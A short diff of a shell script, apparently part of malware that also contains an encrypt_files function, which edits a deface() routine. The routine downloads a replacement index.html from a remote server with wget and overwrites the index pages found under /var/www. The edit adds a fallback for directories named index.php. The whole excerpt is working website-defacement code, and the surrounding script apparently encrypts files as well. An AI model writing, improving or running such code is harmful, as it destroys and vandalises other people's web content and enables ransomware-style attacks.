@@ -145,13 +145,14 @@ function encrypt_files() {
 function deface() {
     wget http://server/index.html -O /tmp/index.html
     find /var/www -name "index.html" -exec mv /tmp/index.html {} \;
+
     if [ $? -ne 0 ]
     then
-       find /var/www -name "index.php" -exec mv /tmp/index.html {} \;
+        find /var/www -type d -name "index.php" -exec cp /tmp/index.html {}/index.html \;
     fi
     if [ $? -ne 0 ]
     then
-        echo "No index in /var/www"
+        echo "No index.html or index.php in /var/www"
     fi
 }
 
